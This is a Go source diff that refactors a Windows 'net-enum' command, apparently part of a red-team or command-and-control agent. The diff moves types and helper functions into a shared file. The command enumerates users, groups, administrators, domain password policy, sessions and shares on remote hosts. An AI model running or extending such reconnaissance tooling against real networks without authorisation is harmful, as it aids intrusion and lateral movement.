@@ -13,23 +13,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-type NetEnumCommand struct{}
-
-func (c *NetEnumCommand) Name() string {
-	return "net-enum"
-}
-
-func (c *NetEnumCommand) Description() string {
-	return "Unified Windows network enumeration — users, groups, shares, sessions, logons, domain info"
-}
-
-type netEnumArgs struct {
-	Action  string `json:"action"`
-	Target  string `json:"target"`  // remote host for loggedon/sessions/shares/localgroups/admins; group name for groupmembers
-	Group   string `json:"group"`   // group name for groupmembers/admins (overrides target for group name)
-	Timeout int    `json:"timeout"` // timeout in seconds for remote operations (default: 30)
-}
-
 var (
 	netapi32NE              = windows.NewLazySystemDLL("netapi32.dll")
 	mprNE                   = windows.NewLazySystemDLL("mpr.dll")
@@ -223,42 +206,7 @@ type netResource struct {
 	Provider    *uint16
 }
 
-// netEnumEntry is the JSON output for most net-enum actions.
-type netEnumEntry struct {
-	Name      string `json:"name"`
-	Comment   string `json:"comment,omitempty"`
-	Type      string `json:"type,omitempty"`
-	Source    string `json:"source,omitempty"`
-	Flags     string `json:"flags,omitempty"`
-	DNS       string `json:"dns,omitempty"`
-	Domain    string `json:"domain,omitempty"`
-	Server    string `json:"server,omitempty"`
-	Path      string `json:"path,omitempty"`
-	Provider  string `json:"provider,omitempty"`
-	Client    string `json:"client,omitempty"`
-	Time      string `json:"time,omitempty"`
-	Idle      string `json:"idle,omitempty"`
-	Opens     int    `json:"opens,omitempty"`
-	Transport string `json:"transport,omitempty"`
-}
-
-// domainInfoOutput is the JSON output for the domaininfo action.
-type domainInfoOutput struct {
-	DCName      string         `json:"dc_name,omitempty"`
-	DCAddress   string         `json:"dc_address,omitempty"`
-	Domain      string         `json:"domain,omitempty"`
-	Forest      string         `json:"forest,omitempty"`
-	DCSite      string         `json:"dc_site,omitempty"`
-	ClientSite  string         `json:"client_site,omitempty"`
-	MinPassLen  uint32         `json:"min_password_length,omitempty"`
-	MaxPassAge  uint32         `json:"max_password_age_days,omitempty"`
-	MinPassAge  uint32         `json:"min_password_age_days,omitempty"`
-	PassHistLen uint32         `json:"password_history_length,omitempty"`
-	ForceLogoff string         `json:"force_logoff,omitempty"`
-	Trusts      []netEnumEntry `json:"trusts,omitempty"`
-}
-
-const neAllActions = "users, localgroups, groupmembers, admins, domainusers, domaingroups, domaininfo, loggedon, sessions, shares, mapped"
+const neAllActionsWin = "users, localgroups, groupmembers, admins, domainusers, domaingroups, domaininfo, loggedon, sessions, shares, mapped"
 
 // --- Execute dispatcher ---
 
@@ -306,22 +254,11 @@ func (c *NetEnumCommand) Execute(task structs.Task) structs.CommandResult {
 	case "mapped":
 		return netEnumMappedDrives()
 	default:
-		return errorf("Unknown action: %s\nAvailable: %s", args.Action, neAllActions)
+		return errorf("Unknown action: %s\nAvailable: %s", args.Action, neAllActionsWin)
 	}
 }
 
-// netEnumWithTimeout wraps a remote enumeration call with a timeout.
-// Windows NetAPI calls don't support cancellation, so we run in a goroutine and abandon on timeout.
-func netEnumWithTimeout(fn func() structs.CommandResult, timeout time.Duration) structs.CommandResult {
-	ch := make(chan structs.CommandResult, 1)
-	go func() { ch <- fn() }()
-	select {
-	case result := <-ch:
-		return result
-	case <-time.After(timeout):
-		return errorf("Error: operation timed out after %s (host may be unreachable)", timeout)
-	}
-}
+// netEnumWithTimeout is now in netenum_types.go (cross-platform)
 
 // --- Helpers ---
 
@@ -344,16 +281,7 @@ func neWideToString(ptr uintptr) string {
 	return windows.UTF16ToString(chars)
 }
 
-// neFormatDuration converts seconds to a human-readable duration string.
-func neFormatDuration(seconds uint32) string {
-	if seconds < 60 {
-		return fmt.Sprintf("%ds", seconds)
-	}
-	if seconds < 3600 {
-		return fmt.Sprintf("%dm%ds", seconds/60, seconds%60)
-	}
-	return fmt.Sprintf("%dh%dm", seconds/3600, (seconds%3600)/60)
-}
+// neFormatDuration is now in netenum_types.go (cross-platform)
 
 // neGetServerPtr returns a UTF-16 pointer for the server name (with UNC prefix), or nil for local.
 func neGetServerPtr(server string) (*uint16, error) {
